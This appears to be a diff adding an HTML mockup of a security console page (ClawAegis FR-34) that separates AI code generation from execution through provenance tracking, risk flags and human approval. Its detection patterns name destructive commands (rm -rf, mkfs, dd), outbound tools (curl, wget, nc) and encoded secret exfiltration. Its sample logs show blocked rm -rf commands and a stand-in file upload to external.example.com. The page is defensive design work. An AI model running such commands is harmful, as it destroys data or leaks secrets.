@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>fr34</title>
+<link rel="stylesheet" href="../css-5.6.css">
+</head>
+<body>
+<div class="main-content">
+<div class="page-section" id="page-fr34">
+
+      <div class="subheader">
+  <div class="subheader-left">
+    <div class="eyebrow">5.6 代码执行与执行链安全</div>
+    <div class="page-title">FR-34 | 代码生成与执行分离 | <span class="badge badge-p0">P0 优先级</span></div>
+  </div>
+  <div style="display:flex;gap:10px;align-items:center">
+    <button class="btn-secondary btn-sm">&#9888; 查看风险报告</button>
+    <button class="btn-primary btn-sm">&#9889; 策略测试</button>
+  </div>
+</div>
+
+<!-- Content Area -->
+
+      <!-- Tabs -->
+<div class="tabs">
+  <div class="tab active" data-tab="tab-separation">分离策略</div>
+  <div class="tab" data-tab="tab-tracking">脚本来源追踪</div>
+  <div class="tab" data-tab="tab-control">执行控制</div>
+  <div class="tab" data-tab="tab-log">分离日志</div>
+</div>
+
+<!-- ==================== Tab 1: 分离策略 ==================== -->
+<div class="tab-content active" id="tab-separation">
+
+  <!-- Panel 1: 生成-执行分离架构图 -->
+  <div class="app-panel-warm">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Architecture</div>
+        <div class="panel-title">生成-执行分离架构流程</div>
+      </div>
+      <span class="badge badge-sys">Script Provenance Guard</span>
+    </div>
+    <div class="flow-diagram">
+      <div class="flow-node gen">AI 生成代码<div class="flow-desc">write / edit / patch</div></div>
+      <div class="flow-arrow">&#10140;</div>
+      <div class="flow-node mark">标记来源<div class="flow-desc">Script Artifact</div></div>
+      <div class="flow-arrow">&#10140;</div>
+      <div class="flow-node write">写入文件<div class="flow-desc">记录路径与工具</div></div>
+      <div class="flow-arrow">&#10140;</div>
+      <div class="flow-node record">Artifact 记录<div class="flow-desc">after_tool_call</div></div>
+      <div class="flow-arrow">&#10140;</div>
+      <div class="flow-node risk">来源风险评估<div class="flow-desc">Risk Flags</div></div>
+      <div class="flow-arrow">&#10140;</div>
+      <div class="flow-node approve">执行前审批<div class="flow-desc">before_tool_call</div></div>
+      <div class="flow-arrow">&#10140;</div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        <div class="flow-node result-pass">&#10003; 允许执行</div>
+        <div class="flow-node result">&#10007; 阻断执行</div>
+      </div>
+    </div>
+    <div class="config-summary">
+      <div class="config-stat"><div class="val" style="color:#1d4ed8">after_tool_call</div><div class="lbl">记录阶段</div></div>
+      <div class="config-stat"><div class="val" style="color:#7c3aed">Strategy #8</div><div class="lbl">管线位置</div></div>
+      <div class="config-stat"><div class="val" style="color:#c2410c">6 项</div><div class="lbl">风险标志</div></div>
+      <div class="config-stat"><div class="val" style="color:#b91c1c">5 项</div><div class="lbl">阻断规则</div></div>
+    </div>
+  </div>
+
+  <!-- Panel 2: ClawAegis Script Provenance Guard 配置 -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">ClawAegis Configuration</div>
+        <div class="panel-title">Script Provenance Guard 配置</div>
+      </div>
+      <span class="badge badge-enforce">Enforce</span>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">scriptProvenanceGuardEnabled</div>
+        <div class="desc">启用脚本来源防护策略，在代码生成与执行间建立安全隔离</div>
+      </div>
+      <div class="toggle-switch">
+        <input type="checkbox" id="toggle-sp-guard" checked>
+        <label class="toggle-slider" for="toggle-sp-guard"></label>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">scriptProvenanceGuardMode</div>
+        <div class="desc">策略运行模式：enforce 阻断高风险脚本执行，observe 仅记录告警</div>
+      </div>
+      <div class="mode-selector" data-mode-group="sp-mode">
+        <div class="mode-btn active-enforce" data-mode="enforce">Enforce</div>
+        <div class="mode-btn" data-mode="observe">Observe</div>
+        <div class="mode-btn" data-mode="off">Off</div>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">Strategy Order</div>
+        <div class="desc">在 10 策略管线中的执行顺序位置</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <span style="font-size:1.2rem;font-weight:700;color:var(--text-h)">8</span>
+        <span style="font-size:11px;color:#8f8681">/ 10</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Panel 3: 分离策略配置 -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Separation Policy</div>
+        <div class="panel-title">分离策略配置</div>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">requireApproval</div>
+        <div class="desc">AI 生成脚本执行前需审批，确保人工确认后才可运行</div>
+      </div>
+      <div class="toggle-switch">
+        <input type="checkbox" id="toggle-approval" checked>
+        <label class="toggle-slider" for="toggle-approval"></label>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">autoExecuteGeneratedCode</div>
+        <div class="desc">禁止自动执行 AI 生成代码，必须经审批流程</div>
+      </div>
+      <div class="toggle-switch">
+        <input type="checkbox" id="toggle-auto-exec">
+        <label class="toggle-slider" for="toggle-auto-exec"></label>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">markGeneratedScripts</div>
+        <div class="desc">标记 AI 生成脚本来源，在脚本文件中注入来源注释</div>
+      </div>
+      <div class="toggle-switch">
+        <input type="checkbox" id="toggle-mark" checked>
+        <label class="toggle-slider" for="toggle-mark"></label>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">approvalTimeout</div>
+        <div class="desc">审批超时时间，超时后自动拒绝执行请求</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <input class="form-input" style="width:100px" type="text" value="300">
+        <span style="font-size:12px;color:#8f8681">秒</span>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">maxGeneratedScriptSize</div>
+        <div class="desc">生成脚本最大尺寸限制，超过阈值将被标记为高风险</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <input class="form-input" style="width:100px" type="text" value="64">
+        <span style="font-size:12px;color:#8f8681">KB</span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ==================== Tab 2: 脚本来源追踪 ==================== -->
+<div class="tab-content" id="tab-tracking">
+
+  <!-- Panel 1: Script Artifact 记录机制 -->
+  <div class="app-panel-warm">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Artifact Recording</div>
+        <div class="panel-title">Script Artifact 记录机制</div>
+      </div>
+      <span class="badge badge-sys">after_tool_call</span>
+    </div>
+    <p style="font-size:13px;color:var(--text);line-height:1.8;margin-bottom:16px">
+      ClawAegis 在 <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">after_tool_call</code> 钩子中，对 <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">write</code> / <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">edit</code> / <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">apply_patch</code> 工具产生的脚本文件进行记录：
+    </p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+      <div style="border-radius:16px;border:1px solid #f1e7e1;background:rgba(255,255,255,0.8);padding:16px">
+        <div style="font-size:12px;font-weight:700;color:var(--text-h);margin-bottom:10px">&#128196; 识别脚本文件</div>
+        <div style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:8px">
+          <strong>扩展名匹配：</strong>
+        </div>
+        <div class="tag-list">
+          <div class="tag">.sh</div><div class="tag">.bash</div><div class="tag">.zsh</div><div class="tag">.js</div><div class="tag">.mjs</div><div class="tag">.cjs</div><div class="tag">.ts</div><div class="tag">.py</div><div class="tag">.ps1</div><div class="tag">.command</div>
+        </div>
+        <div style="font-size:12px;color:var(--text);line-height:1.8;margin-top:10px">
+          <strong>或</strong> 内容以 <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">#!</code> (shebang) 开头
+        </div>
+      </div>
+      <div style="border-radius:16px;border:1px solid #f1e7e1;background:rgba(255,255,255,0.8);padding:16px">
+        <div style="font-size:12px;font-weight:700;color:var(--text-h);margin-bottom:10px">&#128203; 记录内容</div>
+        <div class="check-item"><div class="check-icon pass">&#10003;</div><div class="check-info"><div class="check-name">文件路径</div><div class="check-detail">脚本文件的完整路径</div></div></div>
+        <div class="check-item"><div class="check-icon pass">&#10003;</div><div class="check-info"><div class="check-name">生成时间</div><div class="check-detail">脚本被创建/修改的时间戳</div></div></div>
+        <div class="check-item"><div class="check-icon pass">&#10003;</div><div class="check-info"><div class="check-name">来源工具调用</div><div class="check-detail">write / edit / apply_patch</div></div></div>
+        <div class="check-item"><div class="check-icon pass">&#10003;</div><div class="check-info"><div class="check-name">风险标志</div><div class="check-detail">assessScriptArtifactRiskFlags 评估结果</div></div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Panel 2: 风险评估标志 -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Risk Assessment</div>
+        <div class="panel-title">风险评估标志 (assessScriptArtifactRiskFlags)</div>
+      </div>
+      <span class="badge badge-high">6 项标志</span>
+    </div>
+    <div class="rule-card">
+      <div class="rule-header">
+        <span class="rule-flag">script-high-risk-command</span>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <div class="rule-desc">解码文本匹配 HIGH_RISK_COMMAND_PATTERNS，检测高危系统命令</div>
+      <div class="rule-patterns"><div class="rule-pattern">rm -rf</div><div class="rule-pattern">mkfs</div><div class="rule-pattern">dd if=</div><div class="rule-pattern">chmod 777</div></div>
+    </div>
+    <div class="rule-card">
+      <div class="rule-header">
+        <span class="rule-flag">script-outbound-sink</span>
+        <span class="badge badge-high">High</span>
+      </div>
+      <div class="rule-desc">解码文本匹配外联模式，检测数据外传通道</div>
+      <div class="rule-patterns"><div class="rule-pattern">curl</div><div class="rule-pattern">wget</div><div class="rule-pattern">nc</div><div class="rule-pattern">scp</div></div>
+    </div>
+    <div class="rule-card">
+      <div class="rule-header">
+        <span class="rule-flag">script-secret-exfiltration</span>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <div class="rule-desc">秘密引用 + 外联组合，检测敏感数据外泄行为</div>
+      <div class="rule-patterns"><div class="rule-pattern">$API_KEY</div><div class="rule-pattern">$SECRET</div><div class="rule-pattern">+ curl</div></div>
+    </div>
+    <div class="rule-card">
+      <div class="rule-header">
+        <span class="rule-flag">script-encoded-high-risk-command</span>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <div class="rule-desc">编码后解码为高危命令，检测通过 Base64/Hex 编码绕过的高危操作</div>
+      <div class="rule-patterns"><div class="rule-pattern">base64 -d</div><div class="rule-pattern">xxd -r</div><div class="rule-pattern">\x</div></div>
+    </div>
+    <div class="rule-card">
+      <div class="rule-header">
+        <span class="rule-flag">script-encoded-secret-exfiltration</span>
+        <span class="badge badge-critical">Critical</span>
+      </div>
+      <div class="rule-desc">编码后解码为秘密外泄，检测编码掩盖的敏感数据泄露</div>
+      <div class="rule-patterns"><div class="rule-pattern">echo $KEY | base64</div><div class="rule-pattern">openssl enc</div></div>
+    </div>
+    <div class="rule-card">
+      <div class="rule-header">
+        <span class="rule-flag">script-encoded-outbound-sink</span>
+        <span class="badge badge-high">High</span>
+      </div>
+      <div class="rule-desc">编码后解码为外联，检测编码掩盖的网络外联行为</div>
+      <div class="rule-patterns"><div class="rule-pattern">eval $(base64)</div><div class="rule-pattern">python -c import</div></div>
+    </div>
+  </div>
+
+  <!-- Panel 3: 阻断规则 -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Block Rules</div>
+        <div class="panel-title">阻断规则 (scriptArtifactShouldBlock)</div>
+      </div>
+      <span class="badge badge-blocked">5 项阻断</span>
+    </div>
+    <p style="font-size:12px;color:var(--text);margin-bottom:14px">以下风险标志触发时，将自动阻断脚本执行：</p>
+    <div style="display:flex;flex-wrap:wrap;gap:8px">
+      <div style="border-radius:12px;border:1px solid #fecaca;background:#fee2e2;padding:10px 16px;display:flex;align-items:center;gap:8px">
+        <span style="color:#b91c1c;font-size:16px">&#10007;</span>
+        <span style="font-size:12px;font-weight:600;font-family:monospace;color:#b91c1c">script-high-risk-command</span>
+      </div>
+      <div style="border-radius:12px;border:1px solid #fecaca;background:#fee2e2;padding:10px 16px;display:flex;align-items:center;gap:8px">
+        <span style="color:#b91c1c;font-size:16px">&#10007;</span>
+        <span style="font-size:12px;font-weight:600;font-family:monospace;color:#b91c1c">script-secret-exfiltration</span>
+      </div>
+      <div style="border-radius:12px;border:1px solid #fecaca;background:#fee2e2;padding:10px 16px;display:flex;align-items:center;gap:8px">
+        <span style="color:#b91c1c;font-size:16px">&#10007;</span>
+        <span style="font-size:12px;font-weight:600;font-family:monospace;color:#b91c1c">script-encoded-high-risk-command</span>
+      </div>
+      <div style="border-radius:12px;border:1px solid #fecaca;background:#fee2e2;padding:10px 16px;display:flex;align-items:center;gap:8px">
+        <span style="color:#b91c1c;font-size:16px">&#10007;</span>
+        <span style="font-size:12px;font-weight:600;font-family:monospace;color:#b91c1c">script-encoded-secret-exfiltration</span>
+      </div>
+      <div style="border-radius:12px;border:1px solid #fecaca;background:#fee2e2;padding:10px 16px;display:flex;align-items:center;gap:8px">
+        <span style="color:#b91c1c;font-size:16px">&#10007;</span>
+        <span style="font-size:12px;font-weight:600;font-family:monospace;color:#b91c1c">script-encoded-outbound-sink</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Panel 4: 最近脚本追踪记录 -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Tracking Records</div>
+        <div class="panel-title">最近脚本追踪记录</div>
+      </div>
+      <button class="btn-secondary btn-sm">&#8635; 刷新</button>
+    </div>
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>时间</th>
+          <th>文件路径</th>
+          <th>工具</th>
+          <th>来源</th>
+          <th>风险标志</th>
+          <th>状态</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="font-family:monospace;font-size:12px">10:23:15</td>
+          <td style="font-family:monospace;font-size:12px">/tmp/deploy.sh</td>
+          <td><span class="tag">write</span></td>
+          <td><span class="badge badge-sys">AI生成</span></td>
+          <td><span style="color:#065f46;font-size:12px">none</span></td>
+          <td><span class="badge badge-allowed">&#10003; 已追踪</span></td>
+        </tr>
+        <tr>
+          <td style="font-family:monospace;font-size:12px">10:24:01</td>
+          <td style="font-family:monospace;font-size:12px">/home/user/script.py</td>
+          <td><span class="tag">write</span></td>
+          <td><span class="badge badge-sys">AI生成</span></td>
+          <td><span class="badge badge-high">script-outbound-sink</span></td>
+          <td><span class="badge badge-observed">&#9888; 告警</span></td>
+        </tr>
+        <tr>
+          <td style="font-family:monospace;font-size:12px">10:25:30</td>
+          <td style="font-family:monospace;font-size:12px">/opt/app/run.sh</td>
+          <td><span class="tag">edit</span></td>
+          <td><span class="badge badge-sys">AI修改</span></td>
+          <td><span class="badge badge-critical">script-high-risk-command</span></td>
+          <td><span class="badge badge-blocked">&#10007; 已阻断</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+</div>
+
+<!-- ==================== Tab 3: 执行控制 ==================== -->
+<div class="tab-content" id="tab-control">
+
+  <!-- Panel 1: 执行前校验流程 -->
+  <div class="app-panel-warm">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Pre-Execution Check</div>
+        <div class="panel-title">执行前校验流程</div>
+      </div>
+      <div style="display:flex;gap:8px">
+        <span class="badge badge-sys">before_tool_call</span>
+        <span class="badge badge-sys">Strategy #8</span>
+      </div>
+    </div>
+    <p style="font-size:13px;color:var(--text);line-height:1.8;margin-bottom:16px">
+      在 <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">before_tool_call</code> 钩子中，<strong>script_provenance_guard</strong> (strategy order 8) 拦截 <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">exec</code> / <code style="background:#f5f1ed;border-radius:6px;padding:1px 6px;font-size:12px;font-family:monospace;color:#c2410c">bash</code> 工具调用时，检查目标脚本路径是否在 Script Artifact 记录中：
+    </p>
+    <div style="display:flex;flex-direction:column;gap:12px">
+      <!-- Decision flow -->
+      <div style="border-radius:14px;border:1px solid #eadfd8;background:rgba(255,255,255,0.9);padding:16px">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+          <div style="border-radius:10px;background:#eff6ff;padding:6px 12px;font-size:12px;font-weight:600;color:#1d4ed8">exec / bash 工具调用</div>
+          <span style="color:#c4b0a2">&#10140;</span>
+          <div style="border-radius:10px;background:#fef3c7;padding:6px 12px;font-size:12px;font-weight:600;color:#92400e">查询 Script Artifact 记录</div>
+        </div>
+        <div style="display:flex;gap:16px">
+          <div style="flex:1;border-radius:12px;border:1px solid #fecaca;background:#fff5f5;padding:14px">
+            <div style="font-size:12px;font-weight:700;color:#b91c1c;margin-bottom:8px">&#10007; 脚本在 Artifact 记录中</div>
+            <div style="font-size:12px;color:var(--text);line-height:1.8">
+              &#8594; 检查风险标志 (riskFlags)<br>
+              &#8594; 有阻断标志 &#10140; <span class="badge badge-blocked">阻止执行</span><br>
+              &#8594; 无阻断标志 &#10140; <span class="badge badge-observed">记录告警 + 审批</span>
+            </div>
+          </div>
+          <div style="flex:1;border-radius:12px;border:1px solid #bbf7d0;background:#f0fdf4;padding:14px">
+            <div style="font-size:12px;font-weight:700;color:#15803d;margin-bottom:8px">&#10003; 脚本不在 Artifact 记录中</div>
+            <div style="font-size:12px;color:var(--text);line-height:1.8">
+              &#8594; 非AI生成脚本<br>
+              &#8594; 正常执行（交由其他策略检查）
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Panel 2: Inline Execution Guard -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Inline Guard</div>
+        <div class="panel-title">Inline Execution Guard (Strategy Order 6)</div>
+      </div>
+      <div style="display:flex;gap:8px">
+        <span class="badge badge-sys">before_tool_call</span>
+        <span class="badge badge-sys">Strategy #6</span>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
+      <div style="border-radius:14px;border:1px solid #f1e7e1;background:rgba(255,255,255,0.8);padding:16px">
+        <div style="font-size:12px;font-weight:700;color:var(--text-h);margin-bottom:10px">&#128269; 检测解释器</div>
+        <div class="tag-list">
+          <div class="tag">sh</div><div class="tag">bash</div><div class="tag">python</div><div class="tag">node</div><div class="tag">pwsh</div>
+        </div>
+      </div>
+      <div style="border-radius:14px;border:1px solid #f1e7e1;background:rgba(255,255,255,0.8);padding:16px">
+        <div style="font-size:12px;font-weight:700;color:var(--text-h);margin-bottom:10px">&#9888; 内联标志</div>
+        <div style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:8px">
+          <strong>所有解释器：</strong>
+        </div>
+        <div class="tag-list" style="margin-bottom:8px">
+          <div class="tag">-c</div><div class="tag">-e</div>
+        </div>
+        <div style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:4px">
+          <strong>PowerShell 专属：</strong>
+        </div>
+        <div class="tag-list">
+          <div class="tag">-enc</div><div class="tag">-encodedcommand</div>
+        </div>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">INLINE_EXEC_TEXT_MAX_CHARS</div>
+        <div class="desc">内联执行文本最大字符数限制，超出将拦截</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <input class="form-input" style="width:100px" type="text" value="8192">
+        <span style="font-size:12px;color:#8f8681">字符</span>
+      </div>
+    </div>
+    <div class="toggle-row">
+      <div class="toggle-label">
+        <div class="name">内联文本扫描</div>
+        <div class="desc">对内联执行文本执行高危命令 + 保护路径扫描</div>
+      </div>
+      <div class="toggle-switch">
+        <input type="checkbox" id="toggle-inline-scan" checked>
+        <label class="toggle-slider" for="toggle-inline-scan"></label>
+      </div>
+    </div>
+  </div>
+
+  <!-- Panel 3: OpenClaw 命令限制 -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">OpenClaw Protection</div>
+        <div class="panel-title">OpenClaw 命令限制</div>
+      </div>
+      <span class="badge badge-blocked">Restricted</span>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+      <div style="border-radius:14px;border:1px solid #f1e7e1;background:rgba(255,255,255,0.8);padding:16px">
+        <div style="font-size:12px;font-weight:700;color:var(--text-h);margin-bottom:10px">RESTRICTED_OPENCLAW_LAUNCHERS</div>
+        <p style="font-size:12px;color:var(--text);margin-bottom:10px">禁止通过以下包管理器启动 OpenClaw：</p>
+        <div class="tag-list">
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">pnpm</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">npx</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">npm</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">bunx</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">bun</div>
+        </div>
+      </div>
+      <div style="border-radius:14px;border:1px solid #f1e7e1;background:rgba(255,255,255,0.8);padding:16px">
+        <div style="font-size:12px;font-weight:700;color:var(--text-h);margin-bottom:10px">RESTRICTED_OPENCLAW_CONTROL_PATTERNS</div>
+        <p style="font-size:12px;color:var(--text);margin-bottom:10px">禁止对 OpenClaw 执行以下控制操作：</p>
+        <div style="display:flex;flex-wrap:wrap;gap:4px">
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">close</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">stop</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">restart</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">reboot</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">shutdown</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">disable</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">kill</div>
+          <div class="tag" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">terminate</div>
+        </div>
+        <div style="font-size:11px;color:#8f8681;margin-top:8px;font-style:italic">+ "openclaw" 关键词匹配</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ==================== Tab 4: 分离日志 ==================== -->
+<div class="tab-content" id="tab-log">
+
+  <!-- Panel 1: 实时分离日志 -->
+  <div class="app-panel-warm">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Separation Logs</div>
+        <div class="panel-title">代码生成-执行分离日志</div>
+      </div>
+      <div style="display:flex;gap:8px">
+        <button class="btn-secondary btn-sm">&#8635; 刷新</button>
+        <button class="btn-secondary btn-sm">&#128196; 导出</button>
+      </div>
+    </div>
+
+    <!-- Log 1: BLOCKED -->
+    <div class="log-entry">
+      <div class="log-header">
+        <span class="badge badge-blocked">BLOCKED</span>
+        <span class="log-time">2026-05-01 10:25:30.472</span>
+        <span class="log-id">EVT-0x7A3F</span>
+        <span class="badge badge-sys">script_provenance_guard</span>
+      </div>
+      <div class="log-body">
+        执行 AI 生成高危脚本被拦截 — <code>script_provenance_guard</code> 拦截 <code>/tmp/deploy.sh</code> 执行，触发风险标志 <code>script-high-risk-command</code>
+      </div>
+      <div class="log-detail">
+工具调用: exec("/tmp/deploy.sh")
+脚本来源: AI生成 (write @ 10:23:15)
+风险标志: script-high-risk-command
+匹配内容: rm -rf /var/log/*
+策略动作: BLOCKED — 执行被拒绝
+      </div>
+      <div class="log-chain">
+        <div class="log-chain-step">AI 生成脚本</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">Artifact 记录</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">风险标志: high-risk</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">&#10007; 阻断执行</div>
+      </div>
+    </div>
+
+    <!-- Log 2: OBSERVED -->
+    <div class="log-entry">
+      <div class="log-header">
+        <span class="badge badge-observed">OBSERVED</span>
+        <span class="log-time">2026-05-01 10:24:01.815</span>
+        <span class="log-id">EVT-0x7A2B</span>
+        <span class="badge badge-sys">script_provenance_guard</span>
+      </div>
+      <div class="log-body">
+        AI 生成含外联脚本 — 风险标志 <code>script-outbound-sink</code>，当前 observe 模式仅记录告警
+      </div>
+      <div class="log-detail">
+工具调用: write("/home/user/script.py")
+脚本内容: requests.post("https://external.example.com/upload", data=f.read())
+风险标志: script-outbound-sink
+策略模式: observe — 仅告警未阻断
+      </div>
+      <div class="log-chain">
+        <div class="log-chain-step">AI 生成脚本</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">Artifact 记录</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">风险标志: outbound-sink</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step" style="border-color:#fcd34d;background:#fef3c7;color:#92400e">&#9888; 告警 (observe)</div>
+      </div>
+    </div>
+
+    <!-- Log 3: ALLOWED -->
+    <div class="log-entry">
+      <div class="log-header">
+        <span class="badge badge-allowed">ALLOWED</span>
+        <span class="log-time">2026-05-01 10:28:12.093</span>
+        <span class="log-id">EVT-0x7A5E</span>
+        <span class="badge badge-sys">script_provenance_guard</span>
+      </div>
+      <div class="log-body">
+        审批后执行 AI 生成脚本 — 经人工审核确认，允许执行 <code>/home/user/backup.py</code>
+      </div>
+      <div class="log-detail">
+工具调用: exec("/home/user/backup.py")
+脚本来源: AI生成 (write @ 10:26:45)
+风险标志: none
+审批人: admin@company
+审批结果: APPROVED
+策略动作: ALLOWED — 审批通过后执行
+      </div>
+      <div class="log-chain">
+        <div class="log-chain-step">AI 生成脚本</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">Artifact 记录</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">风险标志: none</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">人工审批</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step" style="border-color:#86efac;background:#dcfce7;color:#15803d">&#10003; 允许执行</div>
+      </div>
+    </div>
+
+    <!-- Log 4: BLOCKED inline -->
+    <div class="log-entry">
+      <div class="log-header">
+        <span class="badge badge-blocked">BLOCKED</span>
+        <span class="log-time">2026-05-01 10:30:05.647</span>
+        <span class="log-id">EVT-0x7A71</span>
+        <span class="badge badge-sys">inline_execution_guard</span>
+      </div>
+      <div class="log-body">
+        内联执行高危命令被拦截 — <code>inline_execution_guard</code> 拦截 <code>bash -c "rm -rf /tmp/*"</code>
+      </div>
+      <div class="log-detail">
+工具调用: bash("-c", "rm -rf /tmp/*")
+解释器: bash
+内联标志: -c
+扫描结果: HIGH_RISK_COMMAND_PATTERNS 匹配
+匹配内容: rm -rf /tmp/*
+策略动作: BLOCKED — 内联执行被拒绝
+      </div>
+      <div class="log-chain">
+        <div class="log-chain-step">bash -c 调用</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">内联标志检测</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step">高危命令匹配</div>
+        <div class="log-chain-arrow">&#10140;</div>
+        <div class="log-chain-step" style="border-color:#fecaca;background:#fff5f5;color:#b91c1c">&#10007; 阻断执行</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Panel 2: 日志统计 -->
+  <div class="app-panel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-eyebrow">Statistics</div>
+        <div class="panel-title">分离日志统计 (今日)</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:16px">
+      <div class="stat-mini" style="border-radius:14px;background:rgba(255,255,255,0.85);border:1px solid #f1e7e1;padding:18px">
+        <div class="value" style="color:var(--text-h)">23</div>
+        <div class="label">脚本追踪总数</div>
+      </div>
+      <div class="stat-mini" style="border-radius:14px;background:#fee2e2;border:1px solid #fecaca;padding:18px">
+        <div class="value" style="color:#b91c1c">5</div>
+        <div class="label">阻断次数</div>
+      </div>
+      <div class="stat-mini" style="border-radius:14px;background:#fef3c7;border:1px solid #fcd34d;padding:18px">
+        <div class="value" style="color:#92400e">8</div>
+        <div class="label">告警次数</div>
+      </div>
+      <div class="stat-mini" style="border-radius:14px;background:#dcfce7;border:1px solid #bbf7d0;padding:18px">
+        <div class="value" style="color:#15803d">10</div>
+        <div class="label">审批通过</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+
+</div>
+</div>
+<script>
+
+// Tab switching (event delegation)
+document.addEventListener('click', function(e) {
+  if (e.target.classList.contains('tab')) {
+    var tabId = e.target.getAttribute('data-tab');
+    if (!tabId) return;
+    var tabContainer = e.target.parentElement;
+    tabContainer.querySelectorAll('.tab').forEach(function(t) {
+      t.classList.remove('active');
+    });
+    e.target.classList.add('active');
+    var contentParent = tabContainer.parentElement;
